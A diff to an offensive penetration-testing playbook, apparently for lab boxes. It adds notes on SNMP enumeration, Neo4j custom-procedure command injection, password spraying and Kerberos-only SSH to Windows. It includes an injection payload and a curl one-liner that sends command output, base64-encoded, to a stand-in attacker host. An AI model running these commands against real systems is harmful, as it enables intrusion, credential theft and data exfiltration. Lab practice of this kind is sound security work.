@@ -285,8 +285,21 @@ is — so `+ <user>` grants login as any *non-root* local user. *(reset.vl: `+ s
 pwnloop x "onesixtyone $T -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
 pwnloop x "snmpwalk -v2c -c public $T | tee /engagements/$NAME/scans/snmp.txt"
 pwnloop x "snmpwalk -v2c -c public $T 1.3.6.1.2.1.25.4.2.1.2"   # running processes
+pwnloop x "snmpwalk -v2c -c public $T 1.3.6.1.2.1.1"            # system group
 ```
 Process listings frequently contain credentials passed on the command line.
+
+**Read the system group first — it is a hostname/vhost/product oracle.** The
+`1.3.6.1.2.1.1` subtree (`sysName`, `sysContact`, `sysLocation`, `sysDescr`) is
+almost always filled in by the admin and routinely leaks the real hostname, the
+`.htb` domain, an admin email and — critically — the *name of the application
+running on the box*. On a host where HTTP shows only a stock Apache/IIS default
+page and vhost fuzzing finds nothing, UDP 161 is often the only thing that names
+the vhost/product to go after. That makes a UDP top-100 (or at least `-sU -p161`)
+a *first-wave* scan on a low-TCP-port box, not an afterthought: the default
+community `public` turning a dead-looking web root into a named target is a
+recurring intended path. *(sysLocation "the only daloRADIUS server…" → the whole
+foothold.)*
 
 ## IPsec / IKE (500/udp, 4500/udp NAT-T)
 
@@ -783,6 +796,34 @@ custom binary service, see `references/binary.md`.
 pwnloop x "nc -nv $T <port>"
 ```
 
+## Neo4j / Bolt (7687, 7474) — custom procedures are a shell-out surface
+
+A graph-backed app (anything that renders nodes/edges, or whose errors mention
+`neo4j`/`CypherSyntaxError`) runs Neo4j. Two things to do the moment you can run
+*any* Cypher (directly on Bolt, or through an app's query endpoint — see the
+Cypher-injection class in `web.md`):
+
+1. **Enumerate procedures/functions** — `SHOW PROCEDURES YIELD name, signature`
+   (5.x) or `CALL dbms.procedures()` (older). The built-ins are noise; look for a
+   `custom.*`/app-namespaced procedure. Those are user-written plugins (a jar in
+   `$NEO4J_HOME/plugins`) and are where the bespoke bug lives.
+2. **Treat any custom procedure taking a STRING (a URL, a host, a filename) as a
+   shell-out candidate.** The recurring pattern is a plugin that builds an OS
+   command from its argument — e.g. a "fetch this URL and return the status code"
+   proc that runs `curl <url>` in a shell. Confirm with a timing oracle, then take
+   output in-band:
+   ```
+   CALL custom.getUrlStatusCode("http://127.0.0.1$(sleep 5)") ...   # +5s == injection
+   ```
+   `$(...)`/backticks/`;` all work; it runs as the `neo4j` service user. Only the
+   status/short result comes back, so for command *output* exfil through an
+   egress channel (`curl http://you/$(cmd|base64 -w0)`) once egress is confirmed.
+   APOC (`apoc.load.*`, `apoc.cypher.*`) is the other sink when present.
+
+Also loot: Neo4j stores users as nodes with SHA1 (or SCRYPT) secrets; the app's
+own config/bolt password is frequently reused for a system account (spray it at
+SSH). `data/` under `$NEO4J_HOME` holds the store if you get a filesystem read.
+
 ## Eureka / Spring Cloud service registry (8761 and the microservice mesh)
 
 A `8761/tcp` that answers `401` with `WWW-Authenticate: Basic` and Spring-ish
@@ -845,3 +886,18 @@ means arbitrary types are being instantiated. Registered string fields are
 XML-escaped on serialization, so you cannot inject a raw gadget into a *field*
 read back by a client — the deserialization-of-your-POST on the server is the
 primitive.
+
+## Kerberos-only SSH to a Windows host (GSSAPI)
+
+A Windows OpenSSH server with `PasswordAuthentication no` offers only
+`gssapi-with-mic`, so the shell is Kerberos. The container's openssh usually
+cannot do it (`-o GSSAPIAuthentication=yes` → "unsupported option"), and recent
+paramiko (>=5.0) dropped GSSAPI entirely — reach for **asyncssh**
+(`asyncssh.connect(host, username=u, gss_host=host, preferred_auth=["gssapi-with-mic"])`
+with `KRB5CCNAME` pointing at a TGT ccache). Two gotchas: GSSAPI name
+canonicalization reverse-resolves and dies with `Server not found in Kerberos
+database` until `rdns = false` and `dns_canonicalize_hostname = false` are set in
+`krb5.conf`; and the whole thing runs under `faketime` when the lab clock is
+skewed. asyncssh's `start_sftp_client()` gives file transfer over the same
+session. Validate the password first with `impacket-getTGT` — the ccache both
+proves the credential and feeds every other `-k` tool.
